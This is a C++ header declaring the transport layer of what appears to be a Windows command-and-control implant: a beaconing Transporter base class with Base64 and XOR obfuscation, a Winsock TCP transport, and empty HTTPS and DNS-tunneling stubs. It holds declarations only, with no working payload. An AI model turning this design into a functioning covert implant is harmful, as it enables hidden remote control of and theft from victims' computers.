
/*
├── Transporter (OWNS connection + processing)
│   ├── ConnectionManager (OWNS socket/network)
│   ├── BinarySerializer
│   ├── Base64Encoder
│   └── XOREncryptor
*/

#ifndef TRANSPORTER_H
#define TRANSPORTER_H

#include "MessageHandler.h"
#include "Serializer.h"
#include "Encryptor.h"
#include "Encoder.h"

#include <vector>
#include <memory>


#include <string>
//#include <WinSock2.h>
#include <winsock2.h>

//#include <ws2tcpip.h>

class Transporter
{
public:
	// constructor
	explicit Transporter(MessageHandler* handler) : messageHandler_(handler) {}
	// deconstructor
	virtual ~Transporter() = default; // TODO: what does default do?
	virtual bool connect() = 0;
	virtual bool send(const std::vector<uint8_t>& data) = 0;
	virtual std::vector<uint8_t> receive() = 0;
	virtual bool isConnected() = 0;
	//virtual void disconnect() = 0;

	bool sendMessage(const InternalMessage& msg);
	InternalMessage receiveMessage();
	void beacon();
protected:
	// default subsystems
	MessageHandler* messageHandler_;
	BinarySerializer serializer_;
	B64Encoder encoder_;
	XorEncryptor encryptor_;
private:
	/*
	std::string server;
	uint16_t port;
	SOCKET socket = INVALID_SOCKET;
	bool connected = false;
	*/
	InternalMessage createHeartbeat();

	void handleIncomingMessage(InternalMessage& msg); // TODO: change msg to const at some point?

	uint32_t generateId();

	//std::string parseFilename(const std::vector<uint8_t>& data); return std::string(data.begin(), data.end());
};



class TCPTransporter : public Transporter
{
public:
	//TCPTransporter(const std::string& server, uint16_t port) : server_(server), port_(port) {}
	TCPTransporter(MessageHandler* hdlr, const std::string& server, uint16_t port);
	//TCPTransporter(MessageHandler* hdlr, const std::string& server, std::string port);
	bool send(const std::vector<uint8_t>& data);
	bool connect();
	std::vector<uint8_t> receive();
	bool isConnected() { return connected_; } // TODO: is this even needed?
	
private:
	bool initializeWinsock();


	std::string server_;
	uint16_t port_;
	//std::string port_;
	SOCKET socket_ = INVALID_SOCKET;
	bool connected_ = false;

	//MessageHandler* messageHandler_;

	// objects that this class owns

};

// Handles HTTPS headers, TLS, cookies, etc.
class HTTPSTransport : public Transporter
{

public:
private:
};

// Handles DNS queries/responses, tunneling
class DNSTransport : public Transporter
{

public:
private:
};

typedef std::unique_ptr<Transporter> TransporterUniquePtr;

#endif
